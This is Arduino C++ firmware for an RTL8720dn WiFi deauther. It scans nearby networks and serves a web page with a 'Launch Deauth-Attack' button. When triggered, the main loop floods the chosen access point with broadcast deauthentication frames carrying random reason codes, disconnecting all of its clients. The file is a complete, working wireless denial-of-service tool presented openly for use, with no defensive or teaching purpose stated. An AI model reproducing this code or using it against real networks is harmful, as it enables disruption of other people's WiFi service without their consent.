#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct
{
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
} WiFiScanResult;

char *ssid = "AF";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint16_t deauth_reason;
int LED_cnt = 0;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result)
{
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0)
  {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks()
{
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS)
  {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  }
  else
  {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request)
{
  int path_start = request.indexOf(' ') + 1;
  int path_end = request.indexOf(' ', path_start);
  return request.substring(path_start, path_end);
}

std::map<String, String> parsePost(String &request)
{
  std::map<String, String> post_params;

  int body_start = request.indexOf("\r\n\r\n");
  if (body_start == -1)
  {
    return post_params;
  }
  body_start += 4;

  String post_data = request.substring(body_start);

  int start = 0;
  int end = post_data.indexOf('&', start);

  while (end != -1)
  {
    String key_value_pair = post_data.substring(start, end);
    int delimiter_position = key_value_pair.indexOf('=');

    if (delimiter_position != -1)
    {
      String key = key_value_pair.substring(0, delimiter_position);
      String value = key_value_pair.substring(delimiter_position + 1);
      post_params[key] = value;
    }

    start = end + 1;
    end = post_data.indexOf('&', start);
  }

  String key_value_pair = post_data.substring(start);
  int delimiter_position = key_value_pair.indexOf('=');
  if (delimiter_position != -1)
  {
    String key = key_value_pair.substring(0, delimiter_position);
    String value = key_value_pair.substring(delimiter_position + 1);
    post_params[key] = value;
  }

  return post_params;
}

String makeResponse(int code, String content_type)
{
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url)
{
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client)
{
  String html = "<html><head>";
  html += "<style>";

  // Add css
  html += "body {"
          "  background-color: #121212;"
          "  color: #e0e0e0;"
          "  font-family: Arial, sans-serif;"
          "  margin: 0;"
          "  padding: 0;"
          "  text-align: center;"
          "}";

  html += "h1, h2 {"
          "  color: #76c7c0;"
          "}";

  html += "table {"
          "  width: 80%;"
          "  margin: 20px auto;"
          "  border-collapse: collapse;"
          "}";

  html += "th, td {"
          "  padding: 10px;"
          "  text-align: left;"
          "  border: 1px solid #333;"
          "}";

  html += "tr:nth-child(even) {"
          "  background-color: #333;"
          "}";

  html += "tr:nth-child(odd) {"
          "  background-color: #444;"
          "}";

  html += "th {"
          "  background-color: #333;"
          "  color: #76c7c0;"
          "}";

  html += "input[type='text'], input[type='submit'], select {"
          "  padding: 10px;"
          "  margin: 10px 0;"
          "  background-color: #333;"
          "  border: 1px solid #444;"
          "  color: #e0e0e0;"
          "  border-radius: 5px;"
          "  font-size: 16px;"
          "}";

  html += "input[type='submit'] {"
          "  background-color: #76c7c0;"
          "  cursor: pointer;"
          "  transition: background-color 0.3s;"
          "}";

  html += "input[type='submit']:hover {"
          "  background-color: #4a8884;"
          "}";

  html += "form {"
          "  margin: 20px auto;"
          "  width: 60%;"
          "}";

  html += "a {"
          "  color: #76c7c0;"
          "  text-decoration: none;"
          "  font-size: 16px;"
          "}";

  html += "a:hover {"
          "  color: #4a8884;"
          "}";

  html += "</style>";
  html += "</head><body>";

  html += "<h1>RTL8720dn-Deauther</h1>";
  html += "<h2>WiFi Networks:</h2>";

  // Remove reason input box
  html += "<form method='post' action='/deauth'>";

  // Make check box for AP
  for (int i = 0; i < scan_results.size(); i++)
  {
    html += "<input type='checkbox' name='net_num' value='" + String(i) + "'> " + scan_results[i].ssid + " (" + scan_results[i].bssid_str + ")<br>";
  }

  html += "<br><input type='submit' value='Launch Deauth-Attack'>";
  html += "</form>";

  html += "<form method='post' action='/stop'><input type='submit' value='Stop Deauth-Attack'></form>";

  // Rescan button
  html += "<form method='post' action='/rescan'><input type='submit' value='Rescan'></form>";

  html += "</body></html>";

  String response = makeResponse(200, "text/html");
  response += html;
  client.write(response.c_str());
}

void handle404(WiFiClient &client)
{
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void startDeauth(int network_num)
{
  digitalWrite(LED_R, LOW);
  current_channel = scan_results[network_num].channel;
  wifi_off();
  delay(100);
  wifi_on(RTW_MODE_AP);
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  deauth_running = true;
  memcpy(deauth_bssid, scan_results[network_num].bssid, 6);
  DEBUG_SER_PRINT("Starting Deauth-Attack on: " + scan_results[network_num].ssid + "\n");
  // digitalWrite(LED_R, HIGH);
}

void setup()
{
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  randomSeed(millis());

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0)
  {
    while (true)
      delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++)
  {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++)
    {
      if (j > 0)
        DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  digitalWrite(LED_R, HIGH);
}

void loop()
{
  WiFiClient client = server.available();
  if (client.connected())
  {
    digitalWrite(LED_G, HIGH);

    String request;
    while (client.available())
    {
      while (client.available())
        request += (char)client.read();
      delay(1);
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("Requested path: " + path + "\n");

    if (path == "/")
    {
      handleRoot(client);
    }
    else if (path == "/rescan")
    {
      client.write(makeRedirect("/").c_str());
      digitalWrite(LED_R, LOW);
      if (scanNetworks() != 0)
      {
        while (true)
          delay(1000);
      }
      digitalWrite(LED_R, HIGH);
    }
    else if (path == "/deauth")
    {
      std::map<String, String> post_data = parsePost(request);
      int network_num;
      bool post_valid = true;
      if (post_data.size() == 1)
      { // Chỉ nhận 1 tham số là 'net_num'
        if (post_data.find("net_num") != post_data.end())
        {
          network_num = String(post_data["net_num"]).toInt();
          deauth_reason = random(0, 25); // Sinh lý do ngẫu nhiên từ 0 đến 24
        }
        else
        {
          post_valid = false;
        }
      }
      else
      {
        post_valid = false;
      }
      if (post_valid)
      {
        startDeauth(network_num);
        client.write(makeRedirect("/").c_str());
      }
      else
      {
        DEBUG_SER_PRINT("Received invalid post request!\n");
      }
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/stop")
    {
      deauth_running = false;
      DEBUG_SER_PRINT("Deauth-Attack stopped!");
      client.write(makeRedirect("/").c_str());
    }
    else
    {
      handle404(client);
    }

    client.stop();
    digitalWrite(LED_G, LOW);
  }
  if (deauth_running)
  {
    // Decrease led speed
    LED_cnt++;
    digitalWrite(LED_B, HIGH);
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    delay(50);
    if (LED_cnt % 10 == 0)
    {
      digitalWrite(LED_B, LOW);
    }
  }
  delay(50);
}